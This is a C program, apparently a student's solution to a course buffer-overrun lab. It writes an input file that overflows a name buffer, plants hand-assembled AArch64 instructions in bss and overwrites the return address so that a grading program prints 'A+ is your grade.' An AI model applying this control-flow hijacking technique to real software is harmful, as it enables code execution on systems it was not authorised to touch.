/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Tharun Kumar Tiruppali Kalidoss, Sarika Ahire              */
/*--------------------------------------------------------------------*/

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "miniassembler.h"

int main(void) {
    FILE* psFile;
    unsigned long ret;
    unsigned int adrFormat;
    unsigned int b;
    int i;
    char* name;
    char* formatString;
    
    name = "Sarika Ahire";
    formatString = "A+ is your grade.\n";
    /* return address */
    ret = 0x42007C;

    /* 0x420068 = address of adrFormat in bss: name[] + 16
       0x42007C = address of instruction in bss = (start of name[]) + 20 */
    adrFormat = MiniAssembler_adr(1, 0x420068, 0x42007C);

    /* 0x400874 = address of printf(grade) 
       0x420080 = address of instruction in bss = (start of name[]) + 28 */
    b = MiniAssembler_b(0x400874, 0x420080);

    psFile = fopen("dataA", "w");
    
    /* name from 0-11 */
    fprintf(psFile, "%s", name);
    /* padding from 12-15 */
    for (i = 0; i < 4; i++)
        fprintf(psFile, "%c", '\0');

    /* formatString from 16-33*/
    fprintf(psFile, "%s", formatString);

    /* padding from 34-35*/
    for (i=0; i < 2; i++)
        fprintf(psFile, "%c", '\0');

    /* adr x0,  from 36-39 */
    fwrite(&adrFormat, sizeof(unsigned int), 1, psFile);
    /* b printf from 40-43 */
    fwrite(&b, sizeof(unsigned int), 1, psFile);

    /* padding from 44-47 */
    for (i = 0; i < 4; i++)
        fprintf(psFile, "%c", '\0');
    
    fwrite(&ret, sizeof(unsigned long), 1, psFile);
    return 0;
}